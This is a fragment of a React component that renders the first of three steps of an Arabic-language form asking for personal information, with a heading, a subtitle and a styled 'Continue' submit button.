  ...
  return (
    <NBELayout currentStep={1} totalSteps={3}>
      <div className="text-center mb-6">
        <h2 className="text-xl font-bold text-gray-800 mb-2">المعلومات الشخصية</h2>
        <p className="text-gray-500 text-sm">أدخل بياناتك الشخصية للمتابعة</p>
      </div>
      ...
      <form onSubmit={handleSubmit} className="space-y-5">
        ...
        <button
          type="submit"
          className="w-full bg-gradient-to-l from-[#1a4d2e] to-[#2d6b3f] hover:from-[#163f26] hover:to-[#245a34] text-white font-bold py-4 px-6 rounded-xl transition-all duration-300 transform hover:scale-[1.02] active:scale-[0.98] shadow-lg hover:shadow-xl text-lg mt-4"
        >
          متابعة
        </button>
      </form>
